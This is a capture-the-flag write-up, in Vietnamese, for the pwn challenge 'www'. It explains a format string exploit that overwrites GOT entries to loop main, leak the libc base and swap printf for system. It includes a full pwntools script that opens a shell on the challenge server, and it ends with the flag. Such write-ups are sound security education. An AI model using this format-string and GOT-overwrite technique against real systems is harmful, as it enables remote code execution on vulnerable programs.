## [pwn 188] www 

Có thể dùng lỗi format string tại `printf(name)`. Độ dài nhập vào là 26 chỉ đủ ghi đè 1 địa chỉ nên phải tìm cách lặp main để ghi được nhiều hơn.

-> Ghi đè putchar.got thành main, sau đó chọn bất kỳ lựa chọn nào ngoài ariana() đều có thể quay về main

Tiếp theo mở GDB lên xem có leak được địa chỉ nào hữu dụng không

![](https://i.imgur.com/E5TnYlF.png)

Nhận thấy arg 1 của `printf` là địa chỉ của stdin(`_IO_2_1_stdin_`) (format string x64 -> [đây](https://nixhacker.com/case-of-format-string-in-64-bit-is-it-still-critical/#:~:text=Linux%3A%20RDI%2C%20RSI%2C%20RDX%2C%20RCX%2C%20R8%2C%20%C2%A0R9%2C%20remaining%20from%20the%20stack)) 


-> Tìm đúng version libc (`strings chall | grep GCC` để lấy phiên bản ubuntu rồi lấy libc trên container về) là leak được libc base 

Cuối cùng gọi `system('/bin/sh')` bằng cách:

- Overwrite printf.got thành địa chỉ system, chỉ cần ghi đè 2 byte vì `printf` và `system` có cùng LSB (byte đầu) (rất may vì nếu phải ghi 3 byte thì phải ghi 2 lần, vượt quá 26 ký tự) 
- Tại `fgets` nhập '/bin/sh', `printf(name)` trở thành thành `system('/bin/sh')`

### script

```python
#!/usr/bin/env python3
from pwn import *

exe = './chall'
script = '''
b *0x40154A
b* 0x40160a
b* 0x40139d
set follow-fork-mode parent
c
'''
if args.LOCAL:
    p = process(exe)
elif args.GDB:
    p = process(exe)
    gdb.attach(p, gdbscript=script)
else:
    p = remote('103.245.250.31', 32183)
elf = ELF(exe)
libc = ELF('./libc-2.31.so')

main = 0x40146F
system = 0x404038
printf = 0x404040 
putchar = 0x404018
# binsh = 0x2f62 696e 2f73 6800

# putchar.got -> main
payload = b'%5231c%12$hnaaaa' + p64(putchar)
p.sendlineafter(b'name?\n', payload)
p.recvuntil(b'Adele\n')
p.send(b'b')

# leak libc base
p.sendlineafter(b'name?\n', b'%p')
libc_base = int(p.recvline(), 16) - libc.sym._IO_2_1_stdin_ - 131
log.info('libc base leak ' + hex(libc_base))
p.recvuntil(b'Adele\n')
p.send(b'b')

# printf.got -> system
system = libc.sym.system + libc_base
system = (system & 0xffff00)>>8

payload = b'%' + str(system).encode() + b'c%12$hn'
payload += b'a'*(16-len(payload))
payload += p64(printf+1)

# system('/bin/sh')
print(payload)
p.sendlineafter(b'name?\n', payload)
p.recvuntil(b'Adele\n')
p.send(b'b')
p.sendline(b'/bin/sh\x00')

p.interactive()

# HCMUSCTF{0n3_g4dg3t_js_n0t_tk3_s0lutj0n_t0_4ll_pr0bl3ms}
```